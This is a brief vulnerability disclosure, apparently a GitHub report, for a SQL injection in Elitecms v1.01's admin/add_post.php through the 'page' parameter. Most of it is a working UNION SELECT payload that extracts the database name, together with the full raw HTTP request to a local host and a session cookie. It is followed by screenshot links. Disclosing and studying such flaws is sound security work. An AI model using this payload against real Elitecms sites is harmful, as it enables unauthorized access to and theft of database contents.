# Elitecms v1.01 by elitecms has SQL injection

vendors: https://elitecms.net/download.php

Vulnerability File: /admin/add_post.php

Vulnerability location: ip/eliteCMS1.01/admin/add_post.php?page=, page

dbname: elitecms101

[+] Payload: /eliteCMS1.01/admin/add_post.php?page=-3%20union%20select%201,2,3,4,database(),6,7,8,9,10,11--+ // Leak place ---> page

```sql
GET /eliteCMS1.01/admin/add_post.php?page=-3%20union%20select%201,2,3,4,database(),6,7,8,9,10,11--+ HTTP/1.1
Host: 192.168.1.108
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=307ef75a2f3ab4c1103d8a1e90cf120e
Connection: close
```
![image](https://user-images.githubusercontent.com/54017627/167534480-3156430a-4562-432e-9767-d2b3bc3959be.png)

![image](https://user-images.githubusercontent.com/54017627/167534441-9f2c2e51-53c4-4794-b6f9-9b1853734184.png)
